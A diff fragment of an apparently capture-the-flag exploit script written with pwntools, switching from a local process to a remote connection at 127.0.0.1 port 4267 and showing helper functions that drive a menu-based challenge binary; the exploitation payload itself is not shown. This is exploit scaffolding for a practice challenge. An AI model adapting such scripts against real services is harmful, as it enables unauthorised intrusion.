@@ -4,7 +4,7 @@ from pwn import *
 exe = './chall'
 elf = context.binary = ELF(exe, checksec=True)
 context.log_level = 'debug'
-host, port = '', 1337
+host, port = '127.0.0.1', 4267
 
 def create(idx):
     io.sendlineafter(b'>', b'1')
@@ -18,7 +18,8 @@ def delete(idx):
     
 def exploit():
     global io
-    io = process([exe])
+    # io = process([exe])
+    io = remote(host, port)
     
     for i in range(1, 6):
         create(i)
